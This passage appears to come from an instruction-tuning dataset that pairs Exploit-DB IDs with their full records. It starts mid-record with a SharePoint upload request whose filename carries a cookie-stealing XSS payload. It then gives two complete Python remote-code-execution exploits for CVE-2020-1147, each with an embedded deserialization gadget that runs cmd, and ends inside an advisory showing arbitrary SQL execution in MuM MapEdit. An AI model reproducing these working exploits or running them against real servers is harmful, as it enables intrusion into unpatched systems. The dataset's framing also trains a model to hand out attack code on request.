name=\"MSOTlPn_SelectedWpId\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOTlPn_View\"\n\n0\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOTlPn_ShowSettings\"\n\nFalse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOGallery_SelectedLibrary\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOGallery_FilterString\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOTlPn_Button\"\n\nnone\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\n\nctl00$PlaceHolderMain$ctl00$RptControls$btnOK\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOSPWebPartManager_DisplayModeName\"\n\nBrowse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOSPWebPartManager_ExitingDesignMode\"\n\nfalse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOWebPartPage_Shared\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOLayout_LayoutChanges\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOLayout_InDesignMode\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOSPWebPartManager_OldDisplayModeName\"\n\nBrowse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOSPWebPartManager_StartWebPartEditingName\"\n\nfalse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOSPWebPartManager_EndWebPartEditing\"\n\nfalse\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"_maintainWorkspaceScrollPosition\"\n\n0\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__REQUESTDIGEST\"\n\n[DIGEST]\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n[VIEWSTATE]\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\nE6912F23\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__SCROLLPOSITIONX\"\n\n0\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__SCROLLPOSITIONY\"\n\n0\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"destination\"\n\n[DESTINATION_FOLDER]\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"ctl00$PlaceHolderMain$ctl01$ctl04$InputFile\"; filename=\"' onmouseover=alert(document.cookie) '.jpg\"\nContent-Type: image/jpeg\n\n\nZSL\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"ctl00$PlaceHolderMain$ctl01$ctl04$OverwriteSingle\"\n\non\n------WebKitFormBoundaryewNI1MC6qaHDB50n--"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48747",
        "output": {
            "ID": "48747",
            "File": "exploits/aspx/webapps/48747.py",
            "Description": "Microsoft SharePoint Server 2019 - Remote Code Execution",
            "Date Published": "2020-08-17",
            "Author": "West Shepherd",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-08-17",
            "Date Updated": "2021-07-23",
            "Verified": "0",
            "Codes": [
                "CVE-2020-1147"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Microsoft SharePoint Server 2019 - Remote Code Execution\n# Google Dork: inurl:quicklinks.aspx\n# Date: 2020-08-14\n# Exploit Author: West Shepherd\n# Vendor Homepage: https://www.microsoft.com\n# Version: SharePoint Enterprise Server 2013 Service Pack 1, SharePoint Enterprise Server 2016 , SharePoint Server 2010 Service\n# Pack 2, SharePoint Server 2019\n# Tested on: Windows 2016\n# CVE : CVE-2020-1147\n# Credit goes to Steven Seele and Soroush Dalili\n# Source: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html\n\n#!/usr/bin/python\nfrom sys import argv, exit, stdout, stderr\nimport argparse\nimport requests\nfrom bs4 import BeautifulSoup\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nfrom requests_ntlm import HttpNtlmAuth\nfrom urllib import quote, unquote\nimport logging\n\n\nclass Exploit:\n    # To generate the gadget use:\n    # ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"command\"\n    # ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c \"command\"\n    gadget = '/wEypAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADGBTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBwaW5nIC9uIDEwIDEwLjQ5LjExNy4yNTMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=='\n    control_path_quicklinks = '/_layouts/15/quicklinks.aspx'\n    control_path_quicklinksdialogform = '/_layouts/15/quicklinksdialogform.aspx'\n    control_path = control_path_quicklinks\n\n    def __init__(\n            self,\n            redirect=False,\n            proxy_address='',\n            username='',\n            domain='',\n            password='',\n            target=''\n    ):\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        self.username = '%s\\\\%s' % (domain, username)\n        self.target = target\n        self.password = password\n        self.session = requests.session()\n        self.redirect = redirect\n        self.timeout = 0.5\n        self.proxies = {\n            'http': 'http://%s' % proxy_address,\n            'https': 'http://%s' % proxy_address\n        } \\\n            if proxy_address is not None \\\n               and proxy_address != '' else {}\n        self.headers = {}\n        self.query_params = {\n            'Mode': \"Suggestion\"\n        }\n        self.form_values = {\n            '__viewstate': '',\n            '__SUGGESTIONSCACHE__': ''\n        }\n        self.cookies = {}\n        self.payload = \"\"\"\\\n<DataSet>\n  <xs:schema xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"\nxmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" id=\"somedataset\">\n    <xs:element name=\"somedataset\" msdata:IsDataSet=\"true\"\nmsdata:UseCurrentLocale=\"true\">\n      <xs:complexType>\n        <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\n          <xs:element name=\"Exp_x0020_Table\">\n            <xs:complexType>\n              <xs:sequence>\n                <xs:element name=\"pwn\"\nmsdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter,\nSystem.Web, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider,\nPresentationFramework, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35]], System.Data.Services,\nVersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\ntype=\"xs:anyType\" minOccurs=\"0\"/>\n              </xs:sequence>\n            </xs:complexType>\n          </xs:element>\n        </xs:choice>\n      </xs:complexType>\n    </xs:element>\n  </xs:schema>\n  <diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\"\nxmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">\n    <somedataset>\n      <Exp_x0020_Table diffgr:id=\"Exp Table1\" msdata:rowOrder=\"0\"\ndiffgr:hasChanges=\"inserted\">\n        <pwn xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n        <ExpandedElement/>\n        <ProjectedProperty0>\n            <MethodName>Deserialize</MethodName>\n            <MethodParameters>\n                <anyType\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\nxsi:type=\"xsd:string\">{GADGET}</anyType>\n            </MethodParameters>\n            <ObjectInstance xsi:type=\"LosFormatter\"></ObjectInstance>\n        </ProjectedProperty0>\n        </pwn>\n      </Exp_x0020_Table>\n    </somedataset>\n  </diffgr:diffgram>\n</DataSet>\"\"\".replace('{GADGET}', self.gadget)\n\n    def do_get(self, url, params=None, data=None):\n        return self.session.get(\n            url=url,\n            verify=False,\n            allow_redirects=self.redirect,\n            headers=self.headers,\n            cookies=self.cookies,\n            proxies=self.proxies,\n            data=data,\n            params=params,\n            auth=HttpNtlmAuth(self.username, self.password)\n        )\n\n    def do_post(self, url, data=None, params=None):\n        return self.session.post(\n            url=url,\n            data=data,\n            verify=False,\n            allow_redirects=self.redirect,\n            headers=self.headers,\n            cookies=self.cookies,\n            proxies=self.proxies,\n            params=params,\n            auth=HttpNtlmAuth(self.username, self.password)\n        )\n\n    def parse_page(self, content):\n        soup = BeautifulSoup(content, 'lxml')\n        for key, val in self.form_values.iteritems():\n            try:\n                for tag in soup.select('input[name=%s]' % key):\n                    try:\n                        self.form_values[key] = tag['value']\n                    except Exception as error:\n                        stderr.write('error for key %s error %s\\n' %\n(key, str(error)))\n            except Exception as error:\n                stderr.write('error for selector %s error %s\\n' %\n(key, str(error)))\n        return self\n\n    def debug(self):\n        try:\n            import http.client as http_client\n        except ImportError:\n            import httplib as http_client\n        http_client.HTTPConnection.debuglevel = 1\n        logging.basicConfig()\n        logging.getLogger().setLevel(logging.DEBUG)\n        requests_log = logging.getLogger(\"requests.packages.urllib3\")\n        requests_log.setLevel(logging.DEBUG)\n        requests_log.propagate = True\n        return self\n\n    def clean(self, payload):\n        payload = payload\\\n            .replace('\\n', '')\\\n            .replace('\\r', '')\n        while '  ' in payload:\n            payload = payload\\\n                .replace('  ', ' ')\n        return payload\n\n    def get_form(self):\n        url = '%s%s' % (self.target, self.control_path)\n        resp = self.do_get(url=url, params=self.query_params)\n        self.parse_page(content=resp.content)\n        return resp\n\n    def send_payload(self):\n        url = '%s%s' % (self.target, self.control_path)\n        # self.get_form()\n        self.headers['Content-Type'] = 'application/x-www-form-urlencoded'\n        self.form_values['__SUGGESTIONSCACHE__'] = self.clean(self.payload)\n        self.form_values['__viewstate'] = ''\n        resp = self.do_post(url=url, params=self.query_params,\ndata=self.form_values)\n        return resp\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(add_help=True,\ndescription='CVE-2020-1147 SharePoint exploit')\n    try:\n        parser.add_argument('-target', action='store', help='Target\naddress: http(s)://target.com ')\n        parser.add_argument('-username', action='store', default='',\nhelp='Username to use: first.last')\n        parser.add_argument('-domain', action='store', default='',\nhelp='User domain to use: domain.local')\n        parser.add_argument('-password', action='store', default='',\nhelp='Password to use: Summer2020')\n        parser.add_argument('-both', action='store', default=False,\nhelp='Try both pages (quicklinks.aspx and quicklinksdialogform.aspx):\nFalse')\n        parser.add_argument('-debug', action='store', default=False,\nhelp='Enable debugging: False')\n        parser.add_argument('-proxy', action='store', default='',\nhelp='Enable proxy: 10.10.10.10:8080')\n\n        if len(argv) == 1:\n            parser.print_help()\n            exit(1)\n        options = parser.parse_args()\n\n        exp = Exploit(\n            proxy_address=options.proxy,\n            username=options.username,\n            domain=options.domain,\n            password=options.password,\n            target=options.target\n        )\n\n        if options.debug:\n            exp.debug()\n            stdout.write('target %s username %s domain %s password %s\ndebug %s proxy %s\\n' % (\n                options.target, options.username, options.domain,\noptions.password, options.debug, options.proxy\n            ))\n\n        result = exp.send_payload()\n        stdout.write('Response: %d\\n' % result.status_code)\n        if 'MicrosoftSharePointTeamServices' in result.headers:\n            stdout.write('Version: %s\\n' %\nresult.headers['MicrosoftSharePointTeamServices'])\n        if options.both and result.status_code != 200:\n            exp.control_path = exp.control_path_quicklinksdialogform\n            stdout.write('Trying alternate page\\n')\n            result = exp.send_payload()\n            stdout.write('Response: %d\\n' % result.status_code)\n\n    except Exception as error:\n        stderr.write('error in main %s' % str(error))"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50151",
        "output": {
            "ID": "50151",
            "File": "exploits/aspx/webapps/50151.py",
            "Description": "Microsoft SharePoint Server 2019 - Remote Code Execution (2)",
            "Date Published": "2021-07-23",
            "Author": "Podalirius",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-07-23",
            "Date Updated": "2021-07-23",
            "Verified": "0",
            "Codes": [
                "CVE-2020-1147"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Microsoft SharePoint Server 2019 - Remote Code Execution (2)\n# Google Dork: inurl:quicklinks.aspx\n# Date: 2020-08-14\n# Exploit Author: West Shepherd\n# Vendor Homepage: https://www.microsoft.com\n# Version: SharePoint Enterprise Server 2013 Service Pack 1, SharePoint Enterprise Server 2016 , SharePoint Server 2010 Service\n# Pack 2, SharePoint Server 2019\n# Tested on: Windows 2016\n# CVE : CVE-2020-1147\n# Credit goes to Steven Seele and Soroush Dalili\n# Source: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html\n\n#!/usr/bin/python\nfrom sys import argv, exit, stdout, stderr\nimport argparse\nimport requests\nfrom bs4 import BeautifulSoup\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nfrom requests_ntlm import HttpNtlmAuth\nfrom urllib import quote, unquote\nimport logging\n\n\nclass Exploit(object):\n    # To generate the gadget use:\n    # ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"command\"\n    # ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c \"command\"\n    gadget = '/wEypAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADGBTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBwaW5nIC9uIDEwIDEwLjQ5LjExNy4yNTMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=='\n    control_path_quicklinks = '/_layouts/15/quicklinks.aspx'\n    control_path_quicklinksdialogform = '/_layouts/15/quicklinksdialogform.aspx'\n    control_path = control_path_quicklinks\n\n    def __init__(self, redirect=False, proxy_address='', username='', domain='', password='', target=''):\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        self.username = '%s\\\\%s' % (domain, username)\n        self.target = target\n        self.password = password\n        self.session = requests.session()\n        self.redirect = redirect\n        self.timeout = 0.5\n        self.proxies = {\n            'http': 'http://%s' % proxy_address,\n            'https': 'http://%s' % proxy_address\n        } \\\n            if proxy_address is not None \\\n               and proxy_address != '' else {}\n        self.headers = {}\n        self.query_params = {\n            'Mode': \"Suggestion\"\n        }\n        self.form_values = {\n            '__viewstate': '',\n            '__SUGGESTIONSCACHE__': ''\n        }\n        self.cookies = {}\n        self.payload = \"\"\"\\\n<DataSet>\n  <xs:schema xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"\nxmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" id=\"somedataset\">\n    <xs:element name=\"somedataset\" msdata:IsDataSet=\"true\"\nmsdata:UseCurrentLocale=\"true\">\n      <xs:complexType>\n        <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\n          <xs:element name=\"Exp_x0020_Table\">\n            <xs:complexType>\n              <xs:sequence>\n                <xs:element name=\"pwn\"\nmsdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter,\nSystem.Web, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider,\nPresentationFramework, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35]], System.Data.Services,\nVersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\ntype=\"xs:anyType\" minOccurs=\"0\"/>\n              </xs:sequence>\n            </xs:complexType>\n          </xs:element>\n        </xs:choice>\n      </xs:complexType>\n    </xs:element>\n  </xs:schema>\n  <diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\"\nxmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">\n    <somedataset>\n      <Exp_x0020_Table diffgr:id=\"Exp Table1\" msdata:rowOrder=\"0\"\ndiffgr:hasChanges=\"inserted\">\n        <pwn xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n        <ExpandedElement/>\n        <ProjectedProperty0>\n            <MethodName>Deserialize</MethodName>\n            <MethodParameters>\n                <anyType\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\nxsi:type=\"xsd:string\">{GADGET}</anyType>\n            </MethodParameters>\n            <ObjectInstance xsi:type=\"LosFormatter\"></ObjectInstance>\n        </ProjectedProperty0>\n        </pwn>\n      </Exp_x0020_Table>\n    </somedataset>\n  </diffgr:diffgram>\n</DataSet>\"\"\".replace('{GADGET}', self.gadget)\n\n    def do_get(self, url, params=None, data=None):\n        return self.session.get(\n            url=url,\n            verify=False,\n            allow_redirects=self.redirect,\n            headers=self.headers,\n            cookies=self.cookies,\n            proxies=self.proxies,\n            data=data,\n            params=params,\n            auth=HttpNtlmAuth(self.username, self.password)\n        )\n\n    def do_post(self, url, data=None, params=None):\n        return self.session.post(\n            url=url,\n            data=data,\n            verify=False,\n            allow_redirects=self.redirect,\n            headers=self.headers,\n            cookies=self.cookies,\n            proxies=self.proxies,\n            params=params,\n            auth=HttpNtlmAuth(self.username, self.password)\n        )\n\n    def parse_page(self, content):\n        soup = BeautifulSoup(content, 'lxml')\n        for key, val in self.form_values.iteritems():\n            try:\n                for tag in soup.select('input[name=%s]' % key):\n                    try:\n                        self.form_values[key] = tag['value']\n                    except Exception as error:\n                        stderr.write('error for key %s error %s\\n' % (key, str(error)))\n            except Exception as error:\n                stderr.write('error for selector %s error %s\\n' % (key, str(error)))\n        return self\n\n    def debug(self):\n        try:\n            import http.client as http_client\n        except ImportError:\n            import httplib as http_client\n        http_client.HTTPConnection.debuglevel = 1\n        logging.basicConfig()\n        logging.getLogger().setLevel(logging.DEBUG)\n        requests_log = logging.getLogger(\"requests.packages.urllib3\")\n        requests_log.setLevel(logging.DEBUG)\n        requests_log.propagate = True\n        return self\n\n    def clean(self, payload):\n        payload = payload.replace('\\n', '').replace('\\r', '')\n        while '  ' in payload:\n            payload = payload.replace('  ', ' ')\n        return payload\n\n    def get_form(self):\n        url = '%s%s' % (self.target, self.control_path)\n        resp = self.do_get(url=url, params=self.query_params)\n        self.parse_page(content=resp.content)\n        return resp\n\n    def send_payload(self):\n        url = '%s%s' % (self.target, self.control_path)\n        # self.get_form()\n        self.headers['Content-Type'] = 'application/x-www-form-urlencoded'\n        self.form_values['__SUGGESTIONSCACHE__'] = self.clean(self.payload)\n        self.form_values['__viewstate'] = ''\n        resp = self.do_post(url=url, params=self.query_params, data=self.form_values)\n        return resp\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(add_help=True, description='CVE-2020-1147 SharePoint exploit')\n    try:\n        parser.add_argument(\"-target\", action='store', help='Target address: http(s)://target.com ')\n        parser.add_argument(\"-username\", action='store', default='', help='Username to use: first.last')\n        parser.add_argument(\"-domain\", action='store', default='', help='User domain to use: domain.local')\n        parser.add_argument(\"-password\", action='store', default='', help='Password to use: Summer2020')\n        parser.add_argument(\"-both\", action='store', default=False, help='Try both pages (quicklinks.aspx and quicklinksdialogform.aspx): False')\n        parser.add_argument(\"-debug\", action='store', default=False, help='Enable debugging: False')\n        parser.add_argument(\"-proxy\", action='store', default='', help='Enable proxy: 10.10.10.10:8080')\n\n        if len(argv) == 1:\n            parser.print_help()\n            exit(1)\n        options = parser.parse_args()\n\n        exp = Exploit(\n            proxy_address=options.proxy,\n            username=options.username,\n            domain=options.domain,\n            password=options.password,\n            target=options.target\n        )\n\n        if options.debug:\n            exp.debug()\n            stdout.write('target %s username %s domain %s password %s debug %s proxy %s\\n' % (\n                options.target, options.username, options.domain, options.password, options.debug, options.proxy\n            ))\n\n        result = exp.send_payload()\n        stdout.write('Response: %d\\n' % result.status_code)\n        if 'MicrosoftSharePointTeamServices' in result.headers:\n            stdout.write('Version: %s\\n' % result.headers['MicrosoftSharePointTeamServices'])\n        if options.both and result.status_code != 200:\n            exp.control_path = exp.control_path_quicklinksdialogform\n            stdout.write('Trying alternate page\\n')\n            result = exp.send_payload()\n            stdout.write('Response: %d\\n' % result.status_code)\n\n    except Exception as error:\n        stderr.write('error in main %s' % str(error))"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 40397",
        "output": {
            "ID": "40397",
            "File": "exploits/aspx/webapps/40397.txt",
            "Description": "MuM MapEdit 3.2.6.0 - Multiple Vulnerabilities",
            "Date Published": "2016-09-19",
            "Author": "Paul Baade & Sven Krewitt",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2016-09-19",
            "Date Updated": "2016-09-19",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Security Advisory -- Multiple Vulnerabilities - MuM Map Edit\n\n\n## Product\n\nVendor: Mensch und Maschine Software SE / Mensch und Maschine acadGraph GmbH\nProduct: MapEdit\nAffected software version: 3.2.6.0\n\nMuM MapEdit provides geodata to the internet and intranets and is deployed on several communal and\nregional governmental infrastructures to provide geodata to the population. It consists of a\nsilverlight client and a C#.NET backend. The communication between them is HTTP/S based and involves\nthe NBFS (.NET Binary Format SOAP).\n\nLink: http://www.mum.de/DE_Autodesk-Topobase-GIS-Datenerfassung-MuM-MapEdit.CAD\n\n\n## Status/Metrics/Identifier\n\nCVE-ID: tbd\nCVSS v2 Vector: (AV:N/AC:L/Au:S/C:C/I:C/A:C)\nCVSS Score: 9.0\n\nThe CVSS Score reflects the possibility of an attacker to upload web shells and execute them with\nthe privileges of the web server user.\n\n## Author/Credits\n\nPaul Baade (T\u00dcV Rheinland i-sec GmbH)\nSven Krewitt (T\u00dcV Rheinland i-sec GmbH)\n\n\n## Fixed Versions\n\nAccording to MuM all described vulnerabilities are fixed in version 6.2.74, some of them are reportedly\nalready fixed in version 5.1.\n\n\n## Authentication via GET Parameter\nThe application requires users to provide their credentials via GET Parameters. They can therefore\npossibly be found in server logs or proxy logs. An example URL would be:\n\n    /Mum.Geo.Services/Start.aspx?AutoUrl=1&Username=TEST&Password=TEST[...]\n\n\n## Execution of arbitrary SQL commands on contained SQLite DBs\nThe application contains several SQLite databases. An authenticated user may send POST requests to\nthe URL /Mum.Geo.Services/DataAccessService.svc. This service is used to execute SQL queries\non the databases.\nThe content of the POST request is encoded in Microsofts NBFS (.NET Binary Format SOAP) and can be\ndecoded to the following XML data:\n\nRequest:\n--------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:DataAccessService/QueryData</a:Action>\n                        <a:MessageID>urn:uuid:b086a157-1bce-41be-b25c-492ab4f6dfa3</a:MessageID>\n                        <a:SequenceAcknowledgement>\n                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>\n                        </a:SequenceAcknowledgement>\n                        <a:To s:mustUnderstand=\"1\">http://[host]/Mum.Geo.Services/DataAccessService.svc</a:To>\n            </s:Header>\n            <s:Body>\n                        <QueryData>\n                                   <connection i:type=\"c:SQLiteConnection\" xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c=\"http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess.SQLite\">\n                                               <b:CurrentRepresentation>\n                                                           <b:CollectionFeatureClassName/>\n                                                           <b:Id>0</b:Id>\n                                                           <b:LineFeatureClassName/>\n                                                           <b:Name/>\n                                                           <b:PointFeatureClassName/>\n                                                           <b:PolygonFeatureClassName/>\n                                               </b:CurrentRepresentation>\n                                               <b:DbVersion>999</b:DbVersion>\n                                               <b:Id>0</b:Id>\n                                               <b:Name>SYSTEM</b:Name>\n                                               <b:StorageSchemaType>Unknown</b:StorageSchemaType>\n                                               <c:Filename>[path_to_MumGeoData]\\System\\System.db</c:Filename>\n                                   </connection>\n                                   <sql>select name, caption, version_systemdata from project where id in (select Project_id from usergroup_project where usergroup_id  in (select usergroup_id from user_usergroup where user_id in (select id from user where name='TEST'))) order by caption</sql>\n                                   <queryDefinition xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess\" 